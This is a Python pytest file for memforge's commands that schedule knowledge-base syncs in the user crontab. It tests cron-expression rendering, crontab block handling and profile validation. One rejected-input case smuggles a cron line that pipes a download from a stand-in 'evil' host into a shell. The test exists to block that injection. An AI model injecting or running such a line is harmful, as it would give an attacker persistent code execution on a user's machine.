"""Tests for the `memforge adapter kb` OS-scheduler commands.

The crontab IO is faked in-memory so these tests never touch the real user
crontab; the pure cron/block helpers are exercised directly.
"""

from __future__ import annotations

import json

import pytest
from click.testing import CliRunner

import memforge.main as main
from memforge.main import (
    _apply_crontab_block,
    _has_crontab_block,
    _remove_crontab_block,
    _render_cron_expr,
    _render_crontab_block,
    cli,
)


# --- pure helpers -----------------------------------------------------------

def test_render_cron_expr_presets_and_time():
    assert _render_cron_expr(every="daily") == "0 9 * * *"
    assert _render_cron_expr(every="daily", at_time="08:30") == "30 8 * * *"
    assert _render_cron_expr(every="weekly", at_time="22:00") == "0 22 * * 1"
    assert _render_cron_expr(every="15m") == "*/15 * * * *"
    assert _render_cron_expr(every="daily", cron_expr="*/5 9-17 * * 1-5") == "*/5 9-17 * * 1-5"


@pytest.mark.parametrize("bad", ["bad expr", "0 9 * *", "0 9 * * * extra"])
def test_render_cron_expr_rejects_bad_cron(bad):
    with pytest.raises(ValueError):
        _render_cron_expr(every="daily", cron_expr=bad)


def test_render_cron_expr_rejects_bad_time():
    with pytest.raises(ValueError):
        _render_cron_expr(every="daily", at_time="25:00")


def test_crontab_block_apply_is_idempotent_and_removable():
    base = "# user line\n* * * * * echo hi\n"
    applied = _apply_crontab_block(base, "p", _render_crontab_block("p", "0 9 * * *", "cmd1"))
    assert _has_crontab_block(applied, "p")
    assert "# user line" in applied

    # Re-applying with a different schedule replaces the block, never duplicates it.
    reapplied = _apply_crontab_block(applied, "p", _render_crontab_block("p", "*/15 * * * *", "cmd2"))
    assert reapplied.count("# >>> memforge:kb:p >>>") == 1
    assert "*/15 * * * *" in reapplied
    assert "0 9 * * *" not in reapplied

    # Removing the block restores the user's other lines untouched.
    removed = _remove_crontab_block(reapplied, "p")
    assert not _has_crontab_block(removed, "p")
    assert removed == base


# --- CLI commands with a fake crontab ---------------------------------------

@pytest.fixture
def fake_crontab(monkeypatch):
    store = {"text": ""}
    monkeypatch.setattr(main, "_read_crontab", lambda: store["text"])
    monkeypatch.setattr(main, "_write_crontab", lambda content: store.update(text=content))
    return store


def _add_profile(tmp_path, monkeypatch):
    monkeypatch.setenv("MEMFORGE_ADAPTER_CONFIG", str(tmp_path / "adapter.toml"))
    root = tmp_path / "vault"
    root.mkdir()
    CliRunner().invoke(cli, ["adapter", "kb", "add", "work", "--root", str(root), "--vault-id", "work"])


def test_schedule_installs_cron_and_persists(tmp_path, monkeypatch, fake_crontab):
    _add_profile(tmp_path, monkeypatch)

    result = CliRunner().invoke(cli, ["adapter", "kb", "schedule", "work", "--every", "daily", "--at", "07:15"])

    assert result.exit_code == 0, result.output
    payload = json.loads(result.output)
    assert payload["cron"] == "15 7 * * *"
    assert "adapter kb push work --process-now" in payload["command"]
    assert _has_crontab_block(fake_crontab["text"], "work")

    list_result = CliRunner().invoke(cli, ["adapter", "kb", "list"])
    assert json.loads(list_result.output)["profiles"]["work"]["schedule"] == "15 7 * * *"


def test_schedule_list_reports_installed(tmp_path, monkeypatch, fake_crontab):
    _add_profile(tmp_path, monkeypatch)
    CliRunner().invoke(cli, ["adapter", "kb", "schedule", "work", "--every", "hourly"])

    result = CliRunner().invoke(cli, ["adapter", "kb", "schedule-list"])

    assert result.exit_code == 0, result.output
    assert json.loads(result.output)["schedules"] == [
        {"profile": "work", "cron": "0 * * * *", "installed": True}
    ]


def test_unschedule_removes_block_and_schedule(tmp_path, monkeypatch, fake_crontab):
    _add_profile(tmp_path, monkeypatch)
    CliRunner().invoke(cli, ["adapter", "kb", "schedule", "work", "--every", "daily"])

    result = CliRunner().invoke(cli, ["adapter", "kb", "unschedule", "work"])

    assert result.exit_code == 0, result.output
    assert json.loads(result.output)["removed"] is True
    assert not _has_crontab_block(fake_crontab["text"], "work")

    list_result = CliRunner().invoke(cli, ["adapter", "kb", "list"])
    assert "schedule" not in json.loads(list_result.output)["profiles"]["work"]


def test_schedule_unknown_profile_errors(tmp_path, monkeypatch, fake_crontab):
    monkeypatch.setenv("MEMFORGE_ADAPTER_CONFIG", str(tmp_path / "adapter.toml"))
    result = CliRunner().invoke(cli, ["adapter", "kb", "schedule", "nope"])
    assert result.exit_code != 0


@pytest.mark.parametrize("bad", ["my notes", "work\n0 0 * * * curl evil|sh", "a#b", "a]b", "a/b"])
def test_kb_add_rejects_unsafe_profile_names(tmp_path, monkeypatch, bad):
    """Unsafe names are rejected so they can never reach a crontab line."""
    monkeypatch.setenv("MEMFORGE_ADAPTER_CONFIG", str(tmp_path / "adapter.toml"))
    root = tmp_path / "vault"
    root.mkdir()
    result = CliRunner().invoke(cli, ["adapter", "kb", "add", bad, "--root", str(root)])
    assert result.exit_code != 0
